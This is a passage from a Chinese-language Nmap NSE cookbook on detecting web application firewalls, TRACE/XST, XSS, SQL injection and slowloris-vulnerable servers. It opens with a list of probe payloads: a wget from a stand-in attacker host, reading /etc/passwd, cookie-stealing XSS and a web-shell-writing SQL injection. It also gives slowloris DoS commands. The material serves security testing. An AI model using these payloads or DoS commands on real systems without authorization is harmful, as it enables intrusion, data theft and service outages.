NSE: Probing with payload:?p4yl04d=http://evilsite.com/evilfile.php
NSE: Probing with payload:?p4yl04d=cat%20/etc/passwd
NSE: Probing with payload:?p4yl04d=ping%20google.com
NSE: Probing with payload:?p4yl04d=hostname%00
NSE: Probing with payload:?p4yl04d=<img%20src='x'%20onerror=alert(document.cookie)%20/>
NSE: Probing with payload:?p4yl04d=wget%20http://ev1l.com/xpl01t.txt
NSE: Probing with payload:?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php'--

```

要为探测设置不同的 URI，请设置参数`http-waf-detect.uri`：

```
$ nmap -p80 --script http-waf-detect --script-args http-waf-detect.uri=/webapp/ <target>

```

### HTTP 用户代理

有一些数据包过滤产品会阻止使用 Nmap 的默认 HTTP 用户代理发出的请求。您可以通过设置参数`http.useragent`来使用不同的用户代理值：

```
$ nmap -p80 --script http-waf-detect --script-args http.useragent="Mozilla 42" <target>

```

### HTTP 管线化

一些 Web 服务器允许将多个 HTTP 请求封装在单个数据包中。这可能加快 NSE HTTP 脚本的执行速度，建议在 Web 服务器支持的情况下使用。HTTP 库默认尝试管线化 40 个请求，并根据`Keep-Alive`头部根据流量条件自动调整该数字。

```
$ nmap -p80 --script http-methods --script-args http.pipeline=25 <target>

```

此外，您可以使用参数`http.max-pipeline`来设置要添加到管线中的 HTTP 请求的最大数量。如果设置了脚本参数`http.pipeline`，则将忽略此参数：

```
$.nmap -p80 --script http-methods --script-args http.max-pipeline=10 <target>

```

## 另请参阅

+   *检测可能的 XST 漏洞*配方

+   *在各种 Web 服务器上发现有趣的文件和目录*配方

+   *暴力破解 HTTP 身份验证*配方

+   *滥用 mod_userdir 来枚举用户帐户*配方

+   *测试 Web 应用程序中的默认凭据*配方

+   *暴力破解密码审计 WordPress 安装*配方

+   *暴力破解密码审计 Joomla！安装*配方

+   *在 Web 应用程序中查找 SQL 注入漏洞*配方

+   *检测易受 slowloris 拒绝服务攻击的 Web 服务器*配方

# 检测可能的 XST 漏洞

跨站跟踪（XST）漏洞是由 Web 服务器中启用了 HTTP 方法`TRACE`的存在**跨站脚本（XSS）漏洞**引起的。这种技术主要用于绕过指令`httpOnly`强加的 cookie 限制。渗透测试人员可以使用 Nmap 来快速确定 Web 服务器是否启用了`TRACE`方法，从而节省时间。

这个配方描述了如何使用 Nmap 来检查`TRACE`是否启用，从而可能存在跨站跟踪（XST）漏洞。

## 如何做...

打开终端并输入以下命令：

```
$ nmap -p80 --script http-methods,http-trace --script-args http-methods.retest <target>

```

如果`TRACE`已启用并可访问，我们应该看到类似于这样的东西：

```
PORT    STATE SERVICE
80/tcp  open  http
|_http-trace: TRACE is enabled
| http-methods: GET HEAD POST OPTIONS TRACE
| Potentially risky methods: TRACE
| See http://nmap.org/nsedoc/scripts/http-methods.html
| GET / -> HTTP/1.1 200 OK
|
| HEAD / -> HTTP/1.1 200 OK
|
| POST / -> HTTP/1.1 200 OK
|
| OPTIONS / -> HTTP/1.1 200 OK
|
|_TRACE / -> HTTP/1.1 200 OK

```

否则，`http-trace`将不返回任何内容，`TRACE`将不会列在`http-methods`下：

```
PORT   STATE SERVICE
80/tcp open  http
| http-methods: GET HEAD POST OPTIONS
| GET / -> HTTP/1.1 200 OK
|
| HEAD / -> HTTP/1.1 200 OK
|
| POST / -> HTTP/1.1 200 OK
|
|_OPTIONS / -> HTTP/1.1 200 OK

Nmap done: 1 IP address (1 host up) scanned in 14.41 seconds

```

## 它是如何工作的...

参数`-p80 --script http-methods,http-trace --script-args http-methods.retest`告诉 Nmap 在检测到 Web 服务器时在端口 80 上启动 NSE 脚本`http-methods`和`http-trace`，并分别测试 HTTP`OPTIONS`请求返回的每种方法。

`http-methods`由 Bernd Stroessenreuther 提交，它发送一个`OPTIONS`请求来枚举 Web 服务器支持的方法。

脚本`http-trace`是我写的，它的目的是检测 HTTP 方法`TRACE`的可用性。它只是发送一个`TRACE`请求，并寻找状态码 200，或者服务器回显相同的请求。

## 还有更多...

通过设置脚本参数`http-methods.retest`，我们可以测试`OPTIONS`列出的每个 HTTP 方法，并分析返回值以得出`TRACE`是否可访问且未被防火墙或配置规则阻止的结论。

```
$ nmap -p80 --script http-methods,http-trace --script-args http-methods.retest <target>
PORT    STATE SERVICE
80/tcp  open  http
|_http-trace: TRACE is enabled
| http-methods: GET HEAD POST OPTIONS TRACE
| Potentially risky methods: TRACE
| See http://nmap.org/nsedoc/scripts/http-methods.html
| GET / -> HTTP/1.1 200 OK
|
| HEAD / -> HTTP/1.1 200 OK
|
| POST / -> HTTP/1.1 200 OK
|
| OPTIONS / -> HTTP/1.1 200 OK
|
|_TRACE / -> HTTP/1.1 200 OK

```

请记住，方法`TRACE`可能已启用但未列在`OPTIONS`中，因此运行`http-methods`和`http-trace`两个脚本以获得更好的结果非常重要。

使用参数`http-trace.path`和`http-methods.url-path`来请求与根文件夹（`/`）不同的路径：

```
$ nmap -p80 --script http-methods,http-trace --script-args http-methods.retest,http-trace.path=/secret/,http-methods.url-path=/secret/ <target>

```

### HTTP 用户代理

有一些数据包过滤产品会阻止使用 Nmap 的默认 HTTP 用户代理发出的请求。您可以通过设置参数`http.useragent`来使用不同的 HTTP 用户代理：

```
$ nmap -p80 --script http-trace --script-args http.useragent="Mozilla 42" <target>

```

## 另请参阅

+   *检查 HTTP 代理是否开放*配方

+   *在各种 Web 服务器上发现有趣的文件和目录*配方

+   *检测 Web 应用程序防火墙*配方

+   *在 Web 应用程序中查找 SQL 注入漏洞*配方

+   *检测易受 slowloris 拒绝服务攻击的 Web 服务器*配方

# 在 Web 应用程序中检测跨站脚本漏洞

跨站脚本漏洞允许攻击者伪造内容，窃取用户 cookie，甚至在用户浏览器上执行恶意代码。甚至还有像`Beef`这样的高级利用框架，允许攻击者通过 JavaScript 挂钩执行复杂的攻击。Web 渗透测试人员可以使用 Nmap 以自动化的方式发现 Web 服务器中的这些漏洞。

此配方显示了如何使用 Nmap NSE 在 Web 应用程序中查找跨站脚本漏洞。

## 如何做...

要扫描 Web 服务器以查找易受跨站脚本（XSS）攻击的文件，我们使用以下命令：

```
$ nmap -p80 --script http-unsafe-output-escaping  <target>

```

所有被怀疑易受攻击的文件将被列出：

```
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack
| http-unsafe-output-escaping: 
|_  Characters [> " '] reflected in parameter id at http://target/1.php?id=1

```

脚本输出还将包括易受攻击的参数以及未经过滤或编码返回的字符。

如果您正在使用 PHP 服务器，请改用以下 Nmap 命令：

```
$nmap -p80 --script http-phpself-xss,http-unsafe-output-escaping <target>

```

对于具有易受攻击文件的 Web 服务器，您将看到类似于下面显示的输出：

```
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack
| http-phpself-xss: 
|   VULNERABLE:
|   Unsafe use of $_SERVER["PHP_SELF"] in PHP files
|     State: VULNERABLE (Exploitable)
|     Description:
|       PHP files are not handling safely the variable $_SERVER["PHP_SELF"] causing Reflected Cross Site Scripting vulnerabilities.
| 
|     Extra information:
| 
|   Vulnerable files with proof of concept:
|     http://calder0n.com/sillyapp/three.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E
|     http://calder0n.com/sillyapp/secret/2.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E
|     http://calder0n.com/sillyapp/1.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E
|     http://calder0n.com/sillyapp/secret/1.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E
|   Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=calder0n.com
|     References:
|       http://php.net/manual/en/reserved.variables.server.php
|_      https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
| http-unsafe-output-escaping: 
|_  Characters [> " '] reflected in parameter hola at http://calder0n.com/sillyapp/secret/1.php?hola=1

```

## 它是如何工作的...

脚本`http-unsafe-output-escaping`由 Martin Holst Swende 编写，它会爬取 Web 服务器以检测基于用户输入的 Web 应用程序返回输出的可能问题。脚本会将以下有效负载插入到它找到的所有参数中：

```
ghz%3Ehzx%22zxc%27xcv

```

上面显示的有效负载旨在检测可能导致跨站脚本漏洞的字符`> " '。

我编写了脚本`http-phpself-xss`来检测由于未对`$_SERVER["PHP_SELF"']`脚本进行消毒而导致的跨站脚本漏洞。该脚本将爬取 Web 服务器以查找所有具有`.php`扩展名的文件，并将以下有效负载附加到每个 URI：

```
/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E

```

如果网站上反映了相同的模式，这意味着页面不安全地使用了变量`$_SERVER["PHP_SELF"]`。

脚本`http-unsafe-output-escaping`和`http-phpself-xss`的官方文档可以在以下 URL 找到：

+   [`nmap.org/nsedoc/scripts/http-phpself-xss.html`](http://nmap.org/nsedoc/scripts/http-phpself-xss.html)

+   [`nmap.org/nsedoc/scripts/http-unsafe-output-escaping.html`](http://nmap.org/nsedoc/scripts/http-unsafe-output-escaping.html)

## 还有更多...

脚本`http-unsafe-output-escaping`和`http-phpself-xss`依赖于库`httpspider`。可以配置此库以增加其覆盖范围和整体行为。

例如，该库默认只会爬取 20 页，但我们可以相应地设置参数`httpspider.maxpagecount`以适应更大的网站：

```
$nmap -p80 --script http-phpself-xss --script-args httpspider.maxpagecount=200 <target>

```

另一个有趣的参数是`httpspider.withinhost`，它限制了网络爬虫到给定的主机。这是默认开启的，但如果您需要测试相互链接的一组 Web 应用程序，您可以使用以下命令：

```
$nmap -p80 --script http-phpself-xss --script-args httpspider.withinhost=false <target>

```

我们还可以设置要覆盖的目录的最大深度。默认情况下，此值仅为`3`，因此，如果注意到 Web 服务器具有深度嵌套的文件，特别是在实现“美化 URL”时，例如[/blog/5/news/comment/](http:///blog/5/news/comment/)，建议使用以下命令更新此库参数：

```
$nmap -p80 --script http-phpself-xss --script-args httpspider.maxdepth=10 <target>

```

该库的官方文档可以在[`nmap.org/nsedoc/lib/httpspider.html`](http://nmap.org/nsedoc/lib/httpspider.html)找到。

### HTTP 用户代理

有一些数据包过滤产品会阻止使用 Nmap 的默认 HTTP 用户代理发出的请求。您可以通过设置参数`http.useragent`来使用不同的用户代理值：

```
$ nmap -p80 --script http-sql-injection --script-args http.useragent="Mozilla 42" <target>

```

### HTTP 管线化

一些 Web 服务器允许将多个 HTTP 请求封装在单个数据包中。这可能会加快 NSE HTTP 脚本的执行速度，如果 Web 服务器支持，建议使用。默认情况下，HTTP 库尝试管线化 40 个请求，并根据流量条件自动调整该数字，基于`Keep-Alive`标头。

```
$ nmap -p80 --script http-sql-injection --script-args http.pipeline=25 <target>

```

此外，您可以使用参数`http.max-pipeline`来设置要添加到管线的最大 HTTP 请求数量。如果设置了脚本参数`http.pipeline`，则将忽略此参数：

```
$.nmap -p80 --script http-methods --script-args http.max-pipeline=10 <target>

```

## 另请参阅

+   *检测可能的 XST 漏洞*配方

+   *检测 Web 应用程序防火墙*配方

+   *检测 Web 应用程序中的 SQL 注入漏洞*配方

+   *检测易受 slowloris 拒绝服务攻击的 Web 服务器*配方

# 在 Web 应用程序中查找 SQL 注入漏洞

SQL 注入漏洞是由于未对用户输入进行消毒而引起的，它们允许攻击者执行可能危及整个系统的 DBMS 查询。这种类型的 Web 漏洞非常常见，因为必须测试每个脚本变量，因此检查此类漏洞可能是一项非常乏味的任务。幸运的是，我们可以使用 Nmap 快速扫描 Web 服务器，查找 SQL 注入的易受攻击文件。

此配方展示了如何使用 Nmap NSE 在 Web 应用程序中查找 SQL 注入漏洞。

## 如何做...

要使用 Nmap 扫描 Web 服务器，查找易受 SQL 注入攻击的文件，请使用以下命令：

```
$ nmap -p80 --script http-sql-injection <target>

```

所有易受攻击的文件将显示可能存在漏洞的参数：

```
 PORT   STATE SERVICE
 80/tcp open  http    syn-ack
 | http-sql-injection: 
 |   Possible sqli for queries:
 |_    http://xxx/index.php?param=13'%20OR%20sqlspider

```

## 它是如何工作的...

脚本`http-sql-injection.nse`由 Eddie Bell 和 Piotr Olma 编写。它会爬行 Web 服务器，查找带有参数的表单和 URI，并尝试查找 SQL 注入漏洞。脚本通过插入可能导致应用程序出错的 SQL 查询来确定服务器是否存在漏洞。这意味着脚本不会检测到任何盲目的 SQL 注入漏洞。

脚本匹配的错误消息是从默认位置`/nselib/data/http-sql-errors.lst`中读取的外部文件。此文件来自`fuzzdb`项目（[`code.google.com/p/fuzzdb/`](http://code.google.com/p/fuzzdb/)），用户可以根据需要选择替代文件。

## 还有更多...

`httpspider`库的行为可以通过库参数进行配置。默认情况下，它使用相当保守的值来节省资源，但在全面测试期间，我们需要调整其中的几个参数以获得最佳结果。例如，默认情况下，该库只会爬行 20 页，但我们可以根据需要设置参数`httpspider.maxpagecount`以适应更大的站点，如以下命令所示：

```
$ nmap -p80 --script http-sql-injection --script-args httpspider.maxpagecount=200 <target>

```

另一个有趣的参数是`httpspider.withinhost`，它限制 Web 爬虫到给定的主机。默认情况下已启用，但如果需要测试相互链接的一组 Web 应用程序，可以使用以下命令：

```
$ nmap -p80 --script http-sql-injection --script-args httpspider.withinhost=false <target>

```

我们还可以设置要覆盖的目录的最大深度。默认情况下，此值仅为`3`，因此如果您注意到 Web 服务器具有深度嵌套的文件，特别是在实现了“pretty urls”（例如`/blog/5/news/comment/`）时，建议您更新此库参数：

```
$ nmap -p80 --script http-sql-injection --script-args httpspider.maxdepth=10 <target>

```

该库的官方文档可在[`nmap.org/nsedoc/lib/httpspider.html`](http://nmap.org/nsedoc/lib/httpspider.html)找到。

### HTTP 用户代理

有一些数据包过滤产品会阻止使用 Nmap 的默认 HTTP 用户代理发出的请求。您可以通过设置参数`http.useragent`来使用不同的用户代理值：

```
$ nmap -p80 --script http-sql-injection --script-args http.useragent="Mozilla 42" <target>

```

### HTTP 管线化

一些 Web 服务器允许将一个以上的 HTTP 请求封装在一个数据包中。这可能会加快 NSE HTTP 脚本的执行速度，建议在 Web 服务器支持的情况下使用。HTTP 库默认尝试将 40 个请求进行管线化，并根据`Keep-Alive`标头根据流量情况自动调整该数字。

```
$ nmap -p80 --script http-sql-injection --script-args http.pipeline=25 <target>

```

此外，您可以使用参数`http.max-pipeline`来设置要添加到管线的 HTTP 请求的最大数量。如果设置了脚本参数`http.pipeline`，则将忽略此参数：

```
$ nmap -p80 --script http-methods --script-args http.max-pipeline=10 <target>

```

## 另请参阅

+   *检测可能的 XST 漏洞*食谱

+   *检测 Web 应用程序防火墙*食谱

+   在 Web 应用程序中检测跨站脚本漏洞的*检测*食谱

+   *检测易受 slowloris 拒绝服务攻击影响的 Web 服务器*食谱

# 检测易受 slowloris 拒绝服务攻击影响的 Web 服务器

拒绝服务攻击在当今非常流行，Nmap 可以帮助渗透测试人员检测易受此类攻击影响的 Web 服务器。据推测，“slowloris 拒绝服务”技术是由 Adrian Ilarion Ciobanu 于 2007 年发现的，但 Rsnake 在 DEFCON 17 中发布了第一个工具，证明它影响了包括 Apache 1.x，Apache 2.x，dhttpd 在内的多种产品，可能还有许多其他 Web 服务器。

此食谱展示了如何使用 Nmap 检测 Web 服务器是否容易受到 slowloris DoS 攻击的影响。

## 如何做...

要使用 Nmap 对远程 Web 服务器发起 slowloris 攻击，请使用以下命令：

```
# nmap -p80 --script http-slowloris --max-parallelism 300 <target>

```

结果包括一些攻击统计数据：

```
PORT   STATE SERVICE REASON 
80/tcp open  http    syn-ack
| http-slowloris:
|   Vulnerable:
|   the DoS attack took +5m35s
|   with 300 concurrent connections
|_  and 900 sent queries

```

## 它是如何工作的...

参数`-p80 --script http-slowloris`在端口 80（`-p80`）检测到 Web 服务器时启动 NSE 脚本`http-slowloris`。

slowloris DoS 技术的工作方式与其他拒绝服务技术不同，其他技术会通过请求淹没通信渠道。Slowloris 使用最小的带宽，不会消耗大量资源，只发送最少量的信息以保持连接不关闭。

RSnake 的官方说明可在[`ha.ckers.org/slowloris/`](http://ha.ckers.org/slowloris/)找到。

NSE 脚本由 Aleksandar Nikolic 和 Ange Gutek 编写。官方文档可在以下网址找到：

[`nmap.org/nsedoc/scripts/http-slowloris.html`](http://nmap.org/nsedoc/scripts/http-slowloris.html)

## 还有更多...

要设置每个 HTTP 标头之间的时间，请使用以下命令中的脚本参数`http-slowloris.send_interval`：

```
$ nmap -p80 --script http-slowloris --script-args http-slowloris.send_interval=200 --max-parallelism 300

```

要在一定时间内运行 slowloris 攻击，请使用以下命令中显示的脚本参数`http-slowloris.timelimit`：

```
$ nmap -p80 --script http-slowloris --script-args http-slowloris.timelimit=15m <target>

```

或者，还有一个参数可用于告诉 Nmap 无限期地攻击目标，如以下命令所示：

```
$ nmap -p80 --script http-slowloris --script-args http-slowloris.runforever <target>

```

还有另一个用于检查易受攻击的 Web 服务器的 NSE 脚本，名为`http-slowloris-check`，由 Aleksandar Nikolic 编写。此脚本仅发送两个请求，并且它使用巧妙的方法通过读取和比较连接超时来检测易受攻击的服务器：

```
$ nmap -p80 --script http-slowloris-check <target>

```

### HTTP 用户代理

有一些数据包过滤产品会阻止使用 Nmap 的默认 HTTP 用户代理发出的请求。您可以通过设置参数`http.useragent`来使用不同的用户代理值：

```
$ nmap -p80 --script http-slowloris --script-args http.useragent="Mozilla 42" <target>

```

## 另请参阅

+   检测可能的 XST 漏洞的方法

+   发现各种 Web 服务器上有趣的文件和目录的方法

+   检测 Web 应用程序防火墙的方法

+   在 Web 应用程序中测试默认凭据的方法

+   在 Web 应用程序中找到 SQL 注入漏洞的方法
